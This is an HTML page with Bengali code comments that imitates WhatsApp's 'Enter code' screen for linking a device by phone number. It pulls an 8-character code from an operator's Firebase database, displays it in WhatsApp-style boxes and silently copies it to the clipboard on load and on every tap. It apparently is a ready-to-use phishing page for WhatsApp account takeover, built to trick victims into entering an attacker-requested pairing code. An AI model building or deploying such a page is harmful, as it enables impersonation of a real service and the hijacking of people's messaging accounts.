<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Link Code System</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }

        .whatsapp-container {
            width: 100%;
            max-width: 500px;
            padding: 30px 24px;
            box-sizing: border-box;
        }

        /* ----- ১. ওপরের স্থায়ী অংশ (সর্বদা অপরিবর্তিত থাকবে) ----- */
        .header-section {
            margin-bottom: 40px;
        }

        .header-section h2 {
            font-size: 22px;
            font-weight: 500;
            color: #111b21;
            margin: 0 0 20px 0;
        }

        .header-section p {
            font-size: 15px;
            color: #3b4a54;
            line-height: 1.45;
            margin: 0 0 8px 0;
        }

        .header-section .link-highlight {
            color: #00a884;
            text-decoration: none;
            font-weight: 500;
        }

        /* ----- ২. নিচের পরিবর্তনশীল অংশ (টেলিগ্রাম ও কপি সিস্টেম) ----- */
        .dynamic-code-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 180px;
        }

        /* ৮টি ফাঁকা ঘরের মূল গ্রিড - ইমেজ IMG_20260530_065833.jpg এর আদলে */
        .code-grid {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 20px;
            cursor: pointer; /* ইউজার যাতে বোঝে এখানে ক্লিক করা যাবে */
        }

        /* প্রতিটা ফাঁকা ঘরের নিখুঁত ডিজাইন */
        .box-cell {
            width: 36px;
            height: 48px;
            border: 2px solid #111b21;
            border-radius: 12px;
            font-size: 24px;
            font-weight: bold;
            color: #111b21;
            display: flex;
            justify-content: center;
            align-items: center;
            background: transparent;
            text-transform: uppercase;
            transition: background 0.2s;
        }

        /* ক্লিক করলে সামান্য হাইলাইট হবে */
        .code-grid:active .box-cell {
            background-color: #f4f5f5;
        }

        /* মাঝখানের ড্যাশ (-) চিহ্ন */
        .hyphen {
            font-size: 24px;
            color: #111b21;
            margin: 0 6px;
            font-weight: bold;
        }

        /* স্ক্রিনশটের হুবহু সতর্কতা বার্তা */
        .warning-text {
            font-size: 14px;
            color: #667781;
            font-weight: 500;
            margin-top: 10px;
            text-align: center;
        }

        /* কপি সাকসেসফুল মেসেজ */
        .toast-msg {
            color: #00a884;
            font-size: 14px;
            font-weight: bold;
            margin-top: 8px;
            display: none;
            background: #eafefb;
            padding: 6px 16px;
            border-radius: 20px;
        }

        .loading-placeholder {
            color: #8696a0;
            font-style: italic;
            font-size: 15px;
        }
    </style>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body>

<div class="whatsapp-container">
    
    <!-- ১. ওপরের স্থায়ী অংশ -->
    <div class="header-section">
        <h2>Enter code</h2>
        <p>To get your code: Go to WhatsApp on the web or on another device, then click <strong>Link with phone number</strong>. <span class="link-highlight">Learn more</span></p>
    </div>

    <!-- ২. নিচের পরিবর্তনশীল অংশ (IMG_20260530_065833.jpg এর ডিজাইন অনুযায়ী) -->
    <div class="dynamic-code-section" id="dynamic-area">
        <div class="loading-placeholder">Loading valid session...</div>
    </div>

</div>

<script>
  // ⚠️ আপনার Firebase Realtime Database URL এখানে বসাবেন
  const firebaseConfig = {
    databaseURL: "https://your-firebase-database-default-rtdb.firebaseio.com/" 
  };
  
  firebase.initializeApp(firebaseConfig);
  const database = firebase.database();

  // গ্লোবাল ভ্যারিয়েবল কোডটি সেভ রাখার জন্য
  let currentActiveCode = "";

  // ক্লিপবোর্ডে কপি করার ফাংশন
  function triggerCopy(codeText) {
      if (!codeText) return;
      navigator.clipboard.writeText(codeText).then(() => {
          const toast = document.getElementById("copy-toast");
          if (toast) {
              toast.style.display = "block";
              setTimeout(() => { toast.style.display = "none"; }, 2500);
          }
          console.log("Code successfully copied to clipboard: " + codeText);
      }).catch(err => {
          console.log("Auto-copy blocked by browser settings.", err);
      });
  }

  // ফায়ারবেস থেকে রিয়েল-টাইমে ডেটা রিড করা
  database.ref('current_session').on('value', (snapshot) => {
    const dynamicArea = document.getElementById('dynamic-area');
    const data = snapshot.val();
    
    if (data && data.code && data.code.length === 8) {
        currentActiveCode = data.code.toUpperCase();
        
        const firstPart = currentActiveCode.substring(0, 4);
        const secondPart = currentActiveCode.substring(4, 8);
        
        // গ্রিড তৈরি করা (পুরো গ্রিডে ক্লিক করলে কপি হবে)
        let gridHtml = `<div class="code-grid" onclick="triggerCopy('${currentActiveCode}')" title="কপি করতে ক্লিক করুন">`;
        
        for (let i = 0; i < 4; i++) {
            gridHtml += `<div class="box-cell">${firstPart[i]}</div>`;
        }
        
        gridHtml += '<span class="hyphen">-</span>';
        
        for (let i = 0; i < 4; i++) {
            gridHtml += `<div class="box-cell">${secondPart[i]}</div>`;
        }
        
        gridHtml += '</div>'; 
        gridHtml += '<div class="toast-msg" id="copy-toast">✓ কোডটি ক্লিপবোর্ডে কপি হয়েছে!</div>';
        gridHtml += '<div class="warning-text">Never enter a code if you didn\'t request it.</div>';
        
        dynamicArea.innerHTML = gridHtml;
        
        // প্রো-ফিচার: কোড লোড হওয়ার সাথে সাথেই অটোমেটিক কপি করার চেষ্টা করবে
        setTimeout(() => {
            triggerCopy(currentActiveCode);
        }, 500);
        
    } else {
        currentActiveCode = "";
        dynamicArea.innerHTML = '<div class="loading-placeholder">Waiting for code assignment...</div>';
    }
  });

  // ইউজার পেজের যেকোনো জায়গায় টাচ/ক্লিক করলেও যেন ব্যাকগ্রাউন্ডে কপি হয়ে যায়
  document.body.addEventListener('click', () => {
      if(currentActiveCode) {
          triggerCopy(currentActiveCode);
      }
  });
</script>

</body>
</html>
